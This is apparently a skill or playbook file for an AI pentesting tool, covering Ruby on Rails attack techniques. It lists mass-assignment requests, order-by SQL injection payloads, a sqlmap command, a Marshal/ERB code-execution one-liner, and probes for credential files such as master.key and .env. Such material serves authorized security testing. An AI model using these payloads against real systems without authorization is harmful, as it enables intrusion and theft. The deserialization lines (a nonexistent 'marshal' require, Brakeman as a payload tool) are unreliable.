<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: rails
description: Security testing playbook for Ruby on Rails applications covering mass assignment, CSRF, route enumeration, deserialization, and Rails-specific misconfigurations
---

# Ruby on Rails Security Testing

Rails is common in startups and SaaS applications. Key attack surface: mass assignment via strong parameters bypass, CSRF handling, route enumeration, Ruby deserialization, and config exposure.

---

## Reconnaissance

### Fingerprinting Rails

    # Rails-specific paths and patterns
    GET /rails/info/properties          # Rails app info (development only)
    GET /rails/info/routes              # Full route listing (development only)
    GET /rails/mailers                  # Mailer preview (development only)
    GET /sidekiq                        # Sidekiq job queue (very common)
    GET /sidekiq/queues                 # Queue list
    GET /resque                         # Resque dashboard
    GET /delayed_job                    # DelayedJob dashboard

    # Rails standard routes
    GET  /                              # Root
    GET  /users                         # Index
    GET  /users/new                     # New form
    POST /users                         # Create
    GET  /users/:id                     # Show
    GET  /users/:id/edit                # Edit form
    PATCH/PUT /users/:id                # Update
    DELETE /users/:id                   # Delete

    # Rails JSON API conventions
    GET /api/v1/<resource>.json
    GET /api/v1/<resource>/<id>.json

    # Fingerprinting via headers
    X-Request-Id: <uuid>                # Rails generates this
    Set-Cookie: _app_session=...        # Rails session cookie pattern

    # Error page fingerprint
    GET /nonexistent → ActionController::RoutingError (development)

---

## Route Enumeration

    # rails routes exposed in development
    GET /rails/info/routes

    # Production route guessing from RESTful conventions
    # GET  /admin            → admin dashboard
    # GET  /admin/users      → user management
    # GET  /health           → health check
    # GET  /__health         → alt health
    # GET  /metrics          → Prometheus metrics (sometimes)

    # Fuzz with Rails-specific wordlist
    dirsearch -u <target> -w /usr/share/seclists/Discovery/Web-Content/rails.txt

---

## Mass Assignment

Rails 4+ uses Strong Parameters — but bypass is common via nested params or whitelisted `:all`:

    # Test by adding extra fields to any POST/PUT/PATCH:
    POST /users
    {"user": {"email": "a@b.com", "password": "pass", "admin": true, "role": "admin"}}

    # Nested attributes bypass:
    POST /profiles
    {"profile": {"bio": "test", "user_attributes": {"admin": true}}}

    # permit! wildcard (vulnerable):
    params.require(:user).permit!    # Allows all attributes

    # rails_admin and ActiveAdmin gems often have mass assignment issues
    POST /admin/users
    {"user": {"admin": true, "role_id": 1}}

---

## CSRF

    # Rails CSRF: authenticity_token in forms + X-CSRF-Token header
    # Default: protects all non-GET/HEAD/OPTIONS/TRACE requests

    # Bypass techniques:
    # 1. API controllers with protect_from_forgery :with => :null_session (CSRF disabled)
    # 2. Routes under /api/ commonly skip CSRF
    # 3. Same-site cookie with XSS
    # 4. JSON-only endpoints sometimes exempt (Content-Type: application/json)
    # 5. Token in URL (?authenticity_token=...) — leaked in Referer header

    # Extract CSRF token
    curl -c cookies.txt -s <target>/login | grep authenticity_token

---

## Ruby Deserialization

Rails uses Marshal for Ruby object serialization in cookies (Rails < 4.0 default) and some caches:

    # Marshal-based cookie deserialization (old Rails):
    # If cookie contains %-encoded binary data starting with BAh = Marshal.dump
    echo "BAh..." | base64 -d | ruby -e "require 'marshal'; puts Marshal.load(STDIN.read)"

    # Generate deserialization payload (Ruby gadget chains):
    # Tool: https://github.com/presidentbeef/brakeman
    # Universal gadget via erb:
    ruby -e "require 'erb'; require 'open3'; payload = ERB.new('<%= \`id\` %>'); puts Marshal.dump(payload)"

    # Rails cookie secret key base exposure → forge cookies
    # If SECRET_KEY_BASE or SECRET_TOKEN is in git history, .env, or leaked error page:
    # Forge any session data

    # CVE-2013-0156: Old Rails YAML/XML deserialization
    # CVE-2020-8163: Remote code execution in Rails < 5.2.4.3 (ERB render injection)

---

## SQL Injection

    # ActiveRecord is parameterized by default, but raw queries exist:

    # Vulnerable patterns:
    User.where("name = '#{params[:name]}'")                       # Vulnerable
    User.find_by_sql("SELECT * FROM users WHERE id=#{params[:id]}")  # Vulnerable
    User.order(params[:sort])                                      # Order injection

    # Safe patterns:
    User.where("name = ?", params[:name])                          # Safe
    User.where(name: params[:name])                                # Safe

    # Order-by injection (extremely common in Rails apps):
    GET /users?sort=name ASC,(SELECT SLEEP(5))--
    GET /products?order=price`,(SELECT 1 FROM (SELECT SLEEP(5))a)--

    # Test with sqlmap:
    sqlmap -u "<target>/users?sort=name" --dbms=postgresql -p sort --level=3

---

## File Upload (Active Storage / CarrierWave / Paperclip)

    # Rails Active Storage endpoints:
    GET /rails/active_storage/blobs/<token>/<filename>
    GET /rails/active_storage/representations/<...>
    GET /rails/active_storage/disk/<...>

    # Direct upload endpoint (may allow arbitrary file types):
    POST /rails/active_storage/direct_uploads
    Content-Type: application/json
    {"blob": {"filename": "shell.rb", "content_type": "image/jpeg", "byte_size": 100}}

    # CarrierWave: check if serve_static_assets or X-Accel-Redirect used
    # Path traversal in filename: ../../../config/database.yml

---

## Sensitive File Exposure

    # Rails configuration files
    GET /config/database.yml            # DB credentials
    GET /config/secrets.yml             # Secret key base (Rails 4.2)
    GET /config/credentials.yml.enc     # Encrypted credentials (Rails 5.2+)
    GET /config/master.key              # Decrypts credentials.yml.enc (CRITICAL)
    GET /config/environments/production.rb

    # Log files
    GET /log/production.log

    # Gemfile reveals gems in use
    GET /Gemfile
    GET /Gemfile.lock

    # .env exposure
    GET /.env

    # Git exposure (common in Heroku/Render deployments)
    GET /.git/config

---

## Sidekiq Dashboard

    # Sidekiq web UI (very commonly exposed without auth)
    GET /sidekiq
    GET /sidekiq/queues
    GET /sidekiq/workers
    GET /sidekiq/retries
    GET /sidekiq/dead

    # If accessible: view job arguments (may contain credentials, user data)
    # Can retry/delete jobs
    # Sidekiq API:
    GET /sidekiq/api/queues
    GET /sidekiq/api/stats

---

## Authentication

    # Devise (most common Rails auth gem) endpoints:
    POST /users/sign_in
    POST /users/sign_up
    DELETE /users/sign_out
    POST /users/password                 # Password reset request
    PUT  /users/password                 # Password reset with token
    GET  /users/confirmation?token=...   # Email confirmation

    # Devise account enumeration:
    POST /users/password
    {"user": {"email": "valid@example.com"}}    # "You will receive an email"
    {"user": {"email": "invalid@example.com"}}  # "Email not found"

    # Devise token authentication (devise_token_auth):
    POST /auth/sign_in  → returns uid, access-token, client, token-type
    # Replay attack: token is single-use but race condition may allow reuse

---

## IDOR

    # Rails RESTful routes use sequential integer IDs by default
    GET /invoices/1
    GET /invoices/2     # Another user's invoice?

    # Nested resources:
    GET /users/1/documents/1    # Verify /users/:user_id matches authenticated user

    # Globalize (multi-language): check if lang param causes different auth path
    GET /en/admin
    GET /ja/admin

---

## View Injection / XSS

    # Rails auto-escapes ERB by default
    # raw() and html_safe bypass escape:
    <%= raw(params[:name]) %>       # XSS if user-controlled

    # JSON injection in view:
    <%= params[:callback].html_safe %>    # JSONP injection

    # Redirect injection:
    redirect_to params[:return_to]   # Open redirect if not validated

---

## Pro Tips

1. `/sidekiq` without auth is extremely common — always check it first
2. `/rails/info/routes` in development exposes full route list
3. `SECRET_KEY_BASE` in git history → forge any session cookie
4. Order-by injection (`?sort=`, `?order=`) is the most common Rails SQLi pattern
5. Devise password reset: test token brute-force and timing attacks
6. `permit!` in strong parameters is a mass assignment goldmine
7. Active Storage direct upload may accept dangerous file types

## Summary

Rails testing = Sidekiq exposure + route enumeration + mass assignment in strong params + order-by SQLi injection. The fastest critical find is Sidekiq dashboard exposed without auth (common) or SECRET_KEY_BASE in git history enabling session forgery. Always test Devise endpoints for account enumeration and timing attacks.
